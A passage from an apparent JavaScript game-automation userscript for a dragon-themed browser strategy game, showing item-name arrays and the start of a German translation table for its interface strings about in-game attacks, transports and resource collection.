							'IceDragonHelmet',		'IceDragonClawGuards',	'IceDragonTailGuard',	'IceDragonBodyArmor',
							'SwampDragonHelmet',	'SwampDragonClawGuards','SwampDragonTailGuard',	'SwampDragonBodyArmor',
							'ForestDragonHelmet',	'ForestDragonClawGuards','ForestDragonTailGuard','ForestDragonBodyArmor',
							'DesertDragonHelmet',	'DesertDragonClawGuards','DesertDragonTailGuard',	'DesertDragonBodyArmor'];
// City + Outpost
var co_name     		= [ 'City', 'spectral_dragon outpost', 'ice_dragon outpost', 'swamp_dragon outpost', 'forest_dragon outpost', 'desert_dragon outpost', 'water_dragon outpost', 'stone_dragon outpost', 'fire_dragon outpost', 'wind_dragon outpost'];

/*******************************************************************************
***************************      TRANSLATIONS      ****************************
*******************************************************************************/
var LANG_CODE = navigator.language.substring(0,2).toLowerCase();
var IS_NOT_NATIVE_LANG = (LANG_CODE !== 'en');
var TRANSLATION_ARRAY = {};

function setLanguage ( user_language ) {
LANG_CODE = user_language || LANG_CODE;
switch ( LANG_CODE ){
	/*******************************************************************************
		German  (by Northlight & rosebandit & Moratie)
	*******************************************************************************/
case 'de':
	TRANSLATION_ARRAY = {
		'</B> and <B>' : '</B> und <B>',
		'<b>Bad request!</b>' : '<b>Ungültige Anfrage</b>',
		'<b>Rate Limit Exceeded</b>, too many requests!' : '<b>Serveranfragenlimit überschritten</b>',
		'above the first value' : 'über dem ersten Wert liegen',
		'across' : 'Über',
		'Action Log' : 'Aktions Log',
		'Actions' : 'Aktionen',
		'Activate Attacks Logs' : 'Angriffslogs aktivieren',
		'All alliances' : 'Alle Allianzen',
		'All players' : 'Alle Spieler',
		'All types' : 'Alle',
		'Alliances list retrieved' : 'Allianzliste empfangen',
		'Alliance members list retrieved' : 'Mitgliederliste erneuert',
		'Alliance messages' : 'Allianznachrichten',
		'and' : 'und',
		'Another march request is pending' : 'Eine andere Marschanforderung ist unerledigt',
		'Are you sure you want to delete All Permanent Data' : 'Bist du sicher, dass du deine permanenten Daten löschen willst',
		'Arrival time' : 'Ankunftszeit',
		'at' : 'an',
		' at ' : ' an ',
		' at range' : ' in Reichweite',
		'Attack sent to' : 'Angriff gesendet an',
		'Attacker' : 'Angreifer',
		'Attacking' : 'Angriff',
		'Attacks Configuration' : 'Angriffseinstellung',
		'Attacks Stats' : 'Angriffsstats',
		'Attacks' : 'Angriffe',
		'attempted' : 'versuche',
		'attempt for' : 'versuch für',
		'Auto harvest resources from outposts every' : 'Ressourcen im Außenposten einsammeln',
		'Auto refresh info tab data every' : 'Automatisches Auffrischen des Info-Reiters alle',
		'Automatically' : 'Automatisch',
		'Automatically recall transport 1 minute before delivery' : 'Automatisches Zurückrufen des Transports 1 Min vor Lieferung',
		'Awaiting task completion notification' : 'erwarte Fertigmeldung',
		'Back at the same time' : 'Zur gleichen Zeit zurück',
		'Backup' : 'Sicherung',
		'blue_energy' : 'Blaue Energie',
		'Bookmark' : 'Lesezeichen',
		'Bookmark saved' : 'Lesezeichen gespeichert',
		'Bookmarks' : 'Lesezeichen',
		'Bookmarks Configuration' : 'Lesezeicheneinstellungen',
		'Building' : 'Gebäude',
		'By distance ascending' : 'Nach kürzeste Entfernung',
		'By distance descending' : 'Nach weiteste Entfernung',
		'Cache data' : 'Permanente Daten',
		'Camps/wilds attack reports' : 'Anthro/Wildnis Kampfbericht',
		'Check sentinel reports every ' : 'Überprüfe den Sentinelbericht alle',
		'Check to use UTC time instead of local time' : 'Prüfe, ob UTC Zeit anstatt der eigenen Zeitzone verwendet werden soll',
		'City/Outpost' : 'Städte/Außenposten',
		'Claim' : 'Holen',
		'Claimed' : 'Abgeholt',
		'Claiming quest' : 'Quest abholen',
		'Clear' : 'löschen',
		'Clear all' : 'alles löschen',
		'Clear last attack on all maps' : 'Lösche die letzten Angriffe auf allen Karten',
		'Clear last attack on current map' : 'Lösche die letzten Angriffe auf der aktuellen Karte',
		'Clear local storage (internet cache)' : 'Lösche den Internet Cache',
		'Clear Stats' : 'Statistik löschen',
		'Collected resources at outpost' : 'eingesammelte Resourcen im Aussenposten',
		'Completing...' : 'Fertigstellen...',
		'Completion errors' : 'Fehler beim Fertigstellen',
		'Config' : 'Einstellung',
		'Confirmation' : 'Bestätigung',
		'Console Log' : 'Konsolen Log',
		'Console' : 'Konsole',
		'Coordinates' : 'Koordinaten',
		'Coords' : 'Koords',
		'data successfully fetched' : 'Daten wurden erfolgreich geladen',
		'Date range' : 'Daten Reichweite',
		'Days' : 'Tage',
		'Defense force modified' : 'Verteidigung aktualisiert',
		'Delay before script startup' : 'Verzögerung vor Scriptstart',
		'Delay Between Attacks' : 'Verzögerung zwischen Angriffen',
		'Delay Between Transports' : 'Verzögerung zwischen den Transporten',
		'delayed due to' : 'Verzögerung, weil',
		'delayed due to march limit reached' : 'Verzögerung, weil Anzahl max. Märsche erreicht wurde',
		'delayed due to muster point full' : 'Verzögerung, weil Truppensammelplatz voll ist',
		'delayed due to no available generals' : 'Verzögerung, weil keine Generäle verfügbar sind',
		'delayed due to no available Great Dragon' : 'Verzögerung, weil keine Drachen verfügbar sind',
		'delayed due to pending march request' : 'Verzögerung, weil die Rückmeldung zum Marsch aussteht',
		'delayed due to insufficient troops' : 'Verzögerung, weil keine passenden Truppen verfügbar sind',
		'Delete now' : 'jetzt löschen',
		'Delete Battle Reports' : 'Kampfberichte löschen',
		'Delete messages' : 'Nachrichten löschen',
		'Delete messages of this type' : 'Nachrichten diesen Typs löschen',
		'desert_dragon outpost' : 'Dünenpalast',
		'Detailed search' : 'detaillierte Suche', 
		'Disabled' : 'Deaktiviert',
		'Display official background image' : 'Offizielles Hintergrundbild anzeigen',
		'Dist' : 'Distanz',
		'Distance must be between' : 'Entfernung muss liegen zwischen',
		'Distance' : 'Distanz',
		'Dragon' : 'Drachen',
		'Dragon healing' : 'Drachen Heilung',
		'Do not show alerts obsolete since' : 'Keine Alarme anzeigen vor',
		'Do you want to save in Permanent Data the current script setting' : 'Möchtest du deine aktuellen Einstellungen in den permanenten Daten speichern',
		'Do you want to save Map Data in local file' : 'Möchtest du die kartendaten in einer lokalen Datei speichern', // Jawz
		'Do you want to save Permanent Data in local file' : 'Möchtest du die permanenten Daten in einer lokalen Datei speichern',
		'Dutch' : 'Holländisch',
		'Edit' : 'Bearbeiten',
		'Edit bookmark' : 'Lesezeichen bearbeiten',
		'Enable' : 'Aktivieren',
		'Enable transport of blue energy' : 'Aktiviere transport von Blaue Energie',
		'Enable use of speed-ups in attacks waves' : 'Beschleuniger in Attacken und Wellen benutzen',
		'Enable verbose logging' : 'Aktiviere ausführlichen Log',
		'Enable window drag' : 'Fensterverschiebung aktivieren',
		'Enable the sentinel tower' : 'Aktiviere Sentinelturm',
		'Enabled' : 'Aktiviert',
		'English' : 'Englisch',
		'Enter -1 as troop quantity to use the maximum available' : 'Trage -1 ein, um die max. verfügbaren Truppen zu benutzen',
		'Error' : 'Fehler',
		'Error while retrieving the list of members' : 'Fehler beim Empfang der Mitgliederliste',
		'Error while retrieving player data ' : 'Fehler beim Abrufen von Spielerdaten ',
		'Error while setting defense choice' : 'Fehler beim Einstellen der Verteidigung',
		'Evol' : 'Entwicklung',
		'Exception' : 'Ausnahme',
		'Exclude Great Dragon' : 'Groß-/Elementdrachen ausschließen',
		'failed' : 'gescheitert',
		'failed and returned error' : 'gescheitert mit Fehler',
		'Fast search' : 'schnelle Suche', 
		'Features' : 'Features',
		'Fetching' : 'Auslesen',
		'Fetching Manifest' : 'Manifest auslesen',
		'Fetching Seed' : 'Seed auslesen',
		'Fetching Translation matrix' : 'Übersetzungsmatrix auslesen',
		'Fire' : 'Feuer',
		'FireDragon' : 'Feuerdrache',
		'fire_dragon outpost' : 'Feueraußenposten',
		'First value must be between' : 'Erster Wert muss liegen zwischen ',
		'Flash game Auto refresh every' : 'Automatisches Auffrischen des Spiels alle:',
		'Foes' : 'Feinde',
		'for' : 'für',
		'Force saving current script settings' : 'speichern der aktuellen Einstellungen erzwingen',
		'forest_dragon outpost' : 'Frühlings-Gäa',
		'French' : 'Französisch',
		'Game messages' : 'Spielnachrichten',
		'Game Options' : 'Spieloptionen',
		'GD' : 'GD',
		'Generals' : 'Generäle',
		'German' : 'Deutsch',
		'Getting basic data...' : 'Grunddaten laden...',
		'Getting cities data...' : 'Städtedaten laden...',
		'Getting game data...' : 'Spieldaten laden... ',
		'got' : 'Gefunden',
		'Hide spy alerts' : 'Verstecke Spionagealarme',
		'Hiding' : 'Verstecken',
		'History' : 'Zielespeicher',
		'h' : 'std',
		'Hours' : 'Stunden',
		'ice_dragon outpost' : 'Eisaußenposten',
		'Ice' : 'Eis',
		'Idle' : 'inaktiv',
		'Idle pop' : 'Freie Bürger',
		'In city' : 'In der Stadt',
		'In march' : 'In Bewegung',
		'in progress' : 'in Barbeitung',
		'Include Great Dragon' : 'Groß-/Elementdrachen einschließen',
		'Info' : 'Info',
		'Initialization' : 'wird geladen',
		'Initializing...' : 'initialisiere...',
		'Initializing map, auto-collect, ...' : 'Initialisierung Karte, Auto-Einsammeln , ...',
		'Invalid Date From' : 'Ungültiges Datumsformat